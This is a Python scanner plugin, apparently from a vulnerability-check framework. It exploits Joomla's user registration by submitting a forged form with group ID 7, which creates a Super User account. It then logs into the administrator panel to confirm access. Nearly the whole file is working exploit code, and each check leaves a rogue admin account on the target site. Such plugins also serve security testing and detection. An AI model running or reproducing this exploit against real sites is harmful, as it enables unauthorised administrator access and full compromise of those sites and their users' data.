#!/usr/bin/evn python
# -*-:coding:utf-8 -*-

import hashlib
import uuid
import re


def assign(service, arg):
    if service == fingerprint.joomla:
        return True, arg


def audit(arg):
    url = arg + "index.php/component/users/?task=user.register"
    code, head, res, redir_url, log1 = hackhttp.http(url)
    p = re.compile(r'<input type="hidden" name="([0-9a-f]+)" value="1" />')
    token = p.findall(res)[0]
    password = hashlib.md5(str(uuid.uuid1())).hexdigest()
    payload = """-----------------------------11366146071214659784807441306\r
Content-Disposition: form-data; name="user[name]"\r
\r
{username}\r
-----------------------------11366146071214659784807441306\r
Content-Disposition: form-data; name="user[username]"\r
\r
{username}\r
-----------------------------11366146071214659784807441306\r
Content-Disposition: form-data; name="user[password1]"\r
\r
{password}\r
-----------------------------11366146071214659784807441306\r
Content-Disposition: form-data; name="user[password2]"\r
\r
{password}\r
-----------------------------11366146071214659784807441306\r
Content-Disposition: form-data; name="user[email1]"\r
\r
{email}\r
-----------------------------11366146071214659784807441306\r
Content-Disposition: form-data; name="user[email2]"\r
\r
{email}\r
-----------------------------11366146071214659784807441306\r
Content-Disposition: form-data; name="option"\r
\r
com_users\r
-----------------------------11366146071214659784807441306\r
Content-Disposition: form-data; name="user[groups][]"\r
\r
7\r
-----------------------------11366146071214659784807441306\r
Content-Disposition: form-data; name="task"\r
\r
user.register\r
-----------------------------11366146071214659784807441306\r
Content-Disposition: form-data; name="{token}"\r
\r
1\r
-----------------------------11366146071214659784807441306--\r
""".format(
        username=password, token=token, password=password,
        email="%s@vulcheck.com" % (password))
    head = {
        'Referer': arg + 'index.php/component/users/?view=registration',
        'Content-Type': 'multipart/form-data; boundary=---------------------------11366146071214659784807441306'
    }
    code, head, res, redir_url, log2 = hackhttp.http(
        url, data=payload, headers=head)

    login_url = arg + '/administrator/index.php'
    code, head, res, redir_url, log3 = hackhttp.http(login_url)
    token = p.findall(res)[0]
    login_data = "username={username}&passwd={password}&option=com_login&task=login&return=aW5kZXgucGhw&{token}=1".format(
        username=password, token=token, password=password)
    code, head, res, redir_url, log4 = hackhttp.http(login_url, data=login_data)
    code, head, res, redir_url, log5 = hackhttp.http(login_url)
    if 'System <span class="caret">' in res:
        security_hole(arg, log=log2)

if __name__ == '__main__':
    from dummy import *
    audit(assign(fingerprint.joomla, "http://127.0.0.1:32773/")[1])
